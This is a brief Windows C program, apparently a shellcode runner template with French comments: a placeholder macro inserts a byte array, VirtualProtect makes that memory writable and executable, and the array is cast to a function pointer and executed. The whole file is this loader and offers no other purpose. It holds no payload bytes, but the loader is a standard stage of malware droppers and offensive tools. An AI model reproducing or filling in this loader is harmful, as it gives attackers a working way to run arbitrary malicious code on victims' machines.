#include <windows.h>

int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hInstPrev, PSTR cmdline, int cmdshow)
{
    SET_SHELLCODE_ARRAY
    DWORD dummy;

    VirtualProtect(bytecode, bytecode_size,
                PAGE_EXECUTE_READWRITE, &dummy);

    // cast en fonction
    void (*function)(void) = (void (*)(void))bytecode;
    
    // appel de la fonction
    function();
}